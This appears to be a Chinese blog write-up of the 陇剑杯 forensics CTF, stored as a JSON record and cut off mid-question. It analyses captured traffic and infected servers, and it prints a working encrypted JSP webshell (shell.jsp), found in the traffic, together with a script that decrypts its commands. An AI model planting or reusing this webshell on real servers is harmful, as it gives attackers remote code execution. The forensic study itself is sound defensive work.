{"title":"陇剑杯复现","uid":"dfdceeab913ffdcb95d751ff910c7c8e","slug":"陇剑杯","date":"2023-09-03T12:51:20.000Z","updated":"2023-09-03T12:45:26.000Z","comments":true,"path":"api/articles/陇剑杯.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309032045669.jpeg","content":"<h1 id=\"HW\"><a href=\"#HW\" class=\"headerlink\" title=\"HW\"></a>HW</h1><h2 id=\"hard-web-1\"><a href=\"#hard-web-1\" class=\"headerlink\" title=\"hard_web_1\"></a>hard_web_1</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：\n\n服务器开放了哪些端口，请按照端口大小顺序提交答案，并以英文逗号隔开<span class=\"token punctuation\">(</span>如服务器开放了<span class=\"token number\">80</span> <span class=\"token number\">81</span> <span class=\"token number\">82</span> <span class=\"token number\">83</span>端口，则答案为<span class=\"token number\">80</span><span class=\"token punctuation\">,</span><span class=\"token number\">81</span><span class=\"token punctuation\">,</span><span class=\"token number\">82</span><span class=\"token punctuation\">,</span><span class=\"token number\">83</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>下载附件后，点击分析中的专家信息</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308281940848.png\" alt=\"image-20230828194009687\"></p>\n<p>然后选择Chat，可以发现</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308281941754.png\" alt=\"image-20230828194116668\"></p>\n<p>开放端口为80,8888,888</p>\n<h2 id=\"hard-web-2\"><a href=\"#hard-web-2\" class=\"headerlink\" title=\"hard_web_2\"></a>hard_web_2</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：\n\n服务器中根目录下的flag值是多少？<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>追踪<code>HTTP 20046</code>流</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308282005500.png\" alt=\"image-20230828200505366\"> </p>\n<p>可以发现<code>shell.jsp</code>源码，具体内容如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span><span class=\"token operator\">!</span> <span class=\"token class-name\">String</span> xc<span class=\"token operator\">=</span><span class=\"token string\">\"748007e861908c03\"</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">X</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">ClassLoader</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">public</span> <span class=\"token class-name\">X</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassLoader</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">public</span> <span class=\"token class-name\">Class</span> <span class=\"token class-name\">Q</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> cb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>cb<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> cb<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">x</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> s<span class=\"token punctuation\">,</span><span class=\"token keyword\">boolean</span> m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>crypto<span class=\"token punctuation\">.</span></span>Cipher</span> c<span class=\"token operator\">=</span><span class=\"token class-name\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>crypto<span class=\"token punctuation\">.</span></span>Cipher</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"AES\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>c<span class=\"token punctuation\">.</span><span class=\"token function\">init</span><span class=\"token punctuation\">(</span>m<span class=\"token operator\">?</span><span class=\"token number\">1</span><span class=\"token operator\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>crypto<span class=\"token punctuation\">.</span>spec<span class=\"token punctuation\">.</span></span>SecretKeySpec</span><span class=\"token punctuation\">(</span>xc<span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"AES\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">return</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">doFinal</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">%</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span><span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> data<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">getHeader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content-Length\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>InputStream</span> inputStream<span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">int</span> _num<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_num<span class=\"token operator\">+=</span>inputStream<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span>_num<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span>data<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>data<span class=\"token operator\">=</span><span class=\"token function\">x</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">.</span><span class=\"token function\">getAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"payload\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>session<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"payload\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">X</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Q</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"parameters\"</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token class-name\">Object</span> f<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">)</span>session<span class=\"token punctuation\">.</span><span class=\"token function\">getAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"payload\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>ByteArrayOutputStream</span> arrOut<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>f<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>arrOut<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>f<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>pageContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>f<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>response<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token function\">x</span><span class=\"token punctuation\">(</span>arrOut<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">%</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>key为<code>748007e861908c03</code></p>\n<p>密文如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">b5c1fadbb7e28da08572486d8e6933a84c5144463f178b352c5bda71cff4e8ffe919f0f115a528ebfc4a79b03aea0e31cb22d460ada998c7657d4d0f1be71ffa<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309032035214.png\" alt=\"image-20230903203536059\"></p>\n<p>接下来进行解密即可</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">from <span class=\"token class-name\">Crypto<span class=\"token punctuation\">.</span>Cipher</span> <span class=\"token keyword\">import</span> AES\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">binascii</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">zlib</span>\n\n# 密钥，与 JSP 代码中的密钥相同\nkey <span class=\"token operator\">=</span> b'<span class=\"token number\">748007e861908</span>c03'\n\n# 要解密的加密数据（十六进制形式）\nencrypted_hex_data <span class=\"token operator\">=</span> <span class=\"token string\">\"b5c1fadbb7e28da08572486d8e6933a84c5144463f178b352c5bda71cff4e8ffe919f0f115a528ebfc4a79b03aea0e31cb22d460ada998c7657d4d0f1be71ffa\"</span>\n\ndef <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    cipher <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span><span class=\"token keyword\">new</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_ECB<span class=\"token punctuation\">)</span>\n    decrypted_data <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">.</span><span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> decrypted_data\n\ndef <span class=\"token function\">ungzip</span><span class=\"token punctuation\">(</span>in_str<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    s <span class=\"token operator\">=</span> zlib<span class=\"token punctuation\">.</span><span class=\"token function\">decompress</span><span class=\"token punctuation\">(</span>in_str<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span> <span class=\"token operator\">+</span> zlib<span class=\"token punctuation\">.</span>MAX_WBITS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Decoded and Unzipped:\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span>\n\n# 将十六进制数据转换为字节序列\nencrypted_bytes <span class=\"token operator\">=</span> bytes<span class=\"token punctuation\">.</span><span class=\"token function\">fromhex</span><span class=\"token punctuation\">(</span>encrypted_hex_data<span class=\"token punctuation\">)</span>\n\n# 解密数据并解压缩\ndecrypted_data <span class=\"token operator\">=</span> <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>encrypted_bytes<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span>\n<span class=\"token function\">ungzip</span><span class=\"token punctuation\">(</span>decrypted_data<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"hard-web-3\"><a href=\"#hard-web-3\" class=\"headerlink\" title=\"hard_web_3\"></a>hard_web_3</h2><p>748007e861908c03 用cmd5爆破得到<code>14mk3y</code></p>\n<h1 id=\"SS\"><a href=\"#SS\" class=\"headerlink\" title=\"SS\"></a>SS</h1><h2 id=\"sevrer-save-1\"><a href=\"#sevrer-save-1\" class=\"headerlink\" title=\"sevrer save_1\"></a>sevrer save_1</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：黑客是使用什么漏洞来拿下root权限的。格式为：<span class=\"token constant\">CVE</span><span class=\"token operator\">-</span><span class=\"token number\">2020</span><span class=\"token operator\">-</span><span class=\"token number\">114514</span>\n本题附件见于平台公告的<span class=\"token constant\">SS</span><span class=\"token operator\">.</span>zip，解压密码为c77ad47ba4c85fae66f08ec12e0085dd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>下载附件后追踪TCP流，发现恶意语句</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300903945.png\" alt=\"image-20230830090303852\"></p>\n<p>特征放入浏览器中寻找对应CVE</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300902932.png\" alt=\"image-20230830090233888\"></p>\n<p>因此flag为<code>CVE-2022-22965</code></p>\n<h2 id=\"sevrer-save-2\"><a href=\"#sevrer-save-2\" class=\"headerlink\" title=\"sevrer save_2\"></a>sevrer save_2</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：黑客反弹shell的ip和端口是什么，格式为：<span class=\"token number\">10.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">:</span><span class=\"token number\">4444</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>追踪TCP流，发现木马文件<code>bbbb.sh</code>内容</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300906880.png\" alt=\"image-20230830090620782\"></p>\n<p>得到黑客反弹shell的IP和端口，即<code>192.168.43.128:2333</code></p>\n<h2 id=\"sevrer-save-3\"><a href=\"#sevrer-save-3\" class=\"headerlink\" title=\"sevrer save_3\"></a>sevrer save_3</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：黑客的病毒名称是什么？ 格式为：filename<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在<code>wireshark</code>中输入<code>tcp.port eq 2333</code>可以看到跟反弹的ip的通信</p>\n<p>发现攻击者查看了rsa密钥，启动了ssh服务</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300910352.png\" alt=\"image-20230830091002211\"></p>\n<p>在附件中寻找，发现<code>main</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300911496.png\" alt=\"image-20230830091126881\">此即为病毒名称</p>\n<h2 id=\"sevrer-save-4\"><a href=\"#sevrer-save-4\" class=\"headerlink\" title=\"sevrer save_4\"></a>sevrer save_4</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：黑客的病毒运行后创建了什么用户？请将回答用户名与密码：username<span class=\"token punctuation\">:</span>password<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>查看<code>etc/shadow</code>文件，此处存放的是用户的密码</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300915491.png\" alt=\"image-20230830091557318\"></p>\n<p>可以发现最后一个用户，即<code>11:123456</code></p>\n<h2 id=\"sevrer-save-5\"><a href=\"#sevrer-save-5\" class=\"headerlink\" title=\"sevrer save_5\"></a>sevrer save_5</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：服务器在被入侵时外网ip是多少<span class=\"token operator\">?</span> 格式为：<span class=\"token number\">10.10</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300919797.png\" alt=\"image-20230830091928698\"></p>\n<p>从日志文件中可以看出外网IP为<code>172.105.202.239</code></p>\n<h2 id=\"sevrer-save-6\"><a href=\"#sevrer-save-6\" class=\"headerlink\" title=\"sevrer save_6\"></a>sevrer save_6</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：病毒运行后释放了什么文件？格式：文件<span class=\"token number\">1</span><span class=\"token punctuation\">,</span>文件<span class=\"token number\">2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>.idea</code>内的即为释放的文件</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300923977.png\" alt=\"image-20230830092303928\"></p>\n<h2 id=\"sevrer-save-7\"><a href=\"#sevrer-save-7\" class=\"headerlink\" title=\"sevrer save_7\"></a>sevrer save_7</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：矿池地址是什么？ 格式：domain<span class=\"token punctuation\">:</span><span class=\"token number\">1234</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300924462.png\" alt=\"image-20230830092404373\"></p>\n<h2 id=\"sevrer-save-8\"><a href=\"#sevrer-save-8\" class=\"headerlink\" title=\"sevrer save_8\"></a>sevrer save_8</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：黑客的钱包地址是多少？格式：xx<span class=\"token punctuation\">:</span>xxxxxxxx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300924615.png\"></p>\n<h1 id=\"WS\"><a href=\"#WS\" class=\"headerlink\" title=\"WS\"></a>WS</h1><h2 id=\"Wireshark1-1\"><a href=\"#Wireshark1-1\" class=\"headerlink\" title=\"Wireshark1_1\"></a>Wireshark1_1</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：被入侵主机的IP是？<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>打开附件进行流量分析，可以看到<code>192.168.246.28</code>在向<code>192.168.24.1</code>传输<code>etc/passwd</code>信息，由此可判定受害主机为<code>192.146.246.28</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308282033869.png\" alt=\"image-20230828203308642\"></p>\n<h2 id=\"Wireshark1-2\"><a href=\"#Wireshark1-2\" class=\"headerlink\" title=\"Wireshark1_2\"></a>Wireshark1_2</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：被入侵主机的口令是？<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>追踪TCP流，可以发现<code>password</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308282035936.png\" alt=\"image-20230828203540787\"></p>\n<p>得到flag为<code>youcannevergetthis</code></p>\n<h2 id=\"Wireshark1-3\"><a href=\"#Wireshark1-3\" class=\"headerlink\" title=\"Wireshark1_3\"></a>Wireshark1_3</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：用户目录下第二个文件夹的名称是？<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在追踪流下接着看</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308282038433.png\" alt=\"image-20230828203850392\"></p>\n<p>可以看到执行了<code>ls</code>指令，回显中第二个是<code>Downloads</code>，因此第二个文件夹的名称为<code>Downloads</code></p>\n<h2 id=\"Wireshark1-4\"><a href=\"#Wireshark1-4\" class=\"headerlink\" title=\"Wireshark1_4\"></a>Wireshark1_4</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：<span class=\"token operator\">/</span>etc<span class=\"token operator\">/</span>passwd中倒数第二个用户的用户名是？<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>TCP流追踪</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308282040817.png\" alt=\"image-20230828204052736\"></p>\n<p>mysql为倒数第二个</p>\n<h1 id=\"IR\"><a href=\"#IR\" class=\"headerlink\" title=\"IR\"></a>IR</h1><h2 id=\"IncidentResponse-1\"><a href=\"#IncidentResponse-1\" class=\"headerlink\" title=\"IncidentResponse_1\"></a>IncidentResponse_1</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：你是公司的一名安全运营工程师，今日接到外部监管部门通报，你公司网络出口存在请求挖矿域名的行为。需要立即整改。经过与网络组配合，你们定位到了请求挖矿域名的内网IP是<span class=\"token number\">10.221</span><span class=\"token number\">.36</span><span class=\"token number\">.21</span>。查询CMDB后得知该IP运行了公司的工时系统。（虚拟机账号密码为：root<span class=\"token operator\">/</span><span class=\"token class-name\">IncidentResponsePasswd</span>）\n挖矿程序所在路径是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo <span class=\"token operator\">-</span>n 'strings'<span class=\"token operator\">|</span>md5sum<span class=\"token operator\">|</span>cut <span class=\"token operator\">-</span>d <span class=\"token char\">' '</span> <span class=\"token operator\">-</span>f1获取md5值作为答案）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>redis挖矿</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031724567.png\" alt=\"image-20230903172406537\"></p>\n<p>查看conf文件</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031732154.png\" alt=\"image-20230903173233117\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031734064.png\" alt=\"image-20230903173429035\"></p>\n<p>所以flag为<code>6+72038a870f05cbf923633066e48881</code></p>\n<h2 id=\"IncidentResponse-2\"><a href=\"#IncidentResponse-2\" class=\"headerlink\" title=\"IncidentResponse_2\"></a>IncidentResponse_2</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：挖矿程序连接的矿池域名是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo <span class=\"token operator\">-</span>n 'strings'<span class=\"token operator\">|</span>md5sum<span class=\"token operator\">|</span>cut <span class=\"token operator\">-</span>d <span class=\"token char\">' '</span> <span class=\"token operator\">-</span>f1获取md5值作为答案）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>域名为<code>donate.v2.xmrig.com</code>，因此按照格式转换一下就好了</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031745223.png\" alt=\"image-20230903174557197\"></p>\n<h2 id=\"IncidentResponse-3\"><a href=\"#IncidentResponse-3\" class=\"headerlink\" title=\"IncidentResponse_3\"></a>IncidentResponse_3</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">攻击者入侵服务器的利用的方法是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo <span class=\"token operator\">-</span>n 'strings'<span class=\"token operator\">|</span>md5sum<span class=\"token operator\">|</span>cut <span class=\"token operator\">-</span>d <span class=\"token char\">' '</span> <span class=\"token operator\">-</span>f1获取md5值作为答案）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>查看history</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031747106.png\" alt=\"image-20230903174744077\"></p>\n<p>发现nohup.log</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031748839.png\" alt=\"image-20230903174851812\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031749757.png\" alt=\"image-20230903174923714\"></p>\n<p>猜测是Shiro反序列化漏洞</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031753815.png\" alt=\"image-20230903175352787\"></p>\n<h2 id=\"IncidentResponse-4\"><a href=\"#IncidentResponse-4\" class=\"headerlink\" title=\"IncidentResponse_4\"></a>IncidentResponse_4</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：攻击者的IP是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo <span class=\"token operator\">-</span>n 'strings'<span class=\"token operator\">|</span>md5sum<span class=\"token operator\">|</span>cut <span class=\"token operator\">-</span>d <span class=\"token char\">' '</span> <span class=\"token operator\">-</span>f1获取md5值作为答案）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>history查看历史命令</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031757200.png\" alt=\"image-20230903175740162\"></p>\n<p>发现多次ping<code>81.70.166.3</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031758341.png\"></p>\n<h2 id=\"IncidentResponse-5\"><a href=\"#IncidentResponse-5\" class=\"headerlink\" title=\"IncidentResponse_5\"></a>IncidentResponse_5</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：攻击者发起攻击时使用的<span class=\"token class-name\">User</span><span class=\"token operator\">-</span><span class=\"token class-name\">Agent</span>是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo <span class=\"token operator\">-</span>n 'strings'<span class=\"token operator\">|</span>md5sum<span class=\"token operator\">|</span>cut <span class=\"token operator\">-</span>d <span class=\"token char\">' '</span> <span class=\"token operator\">-</span>f1获取md5值作为答案）<span aria-hidden=\"true\" 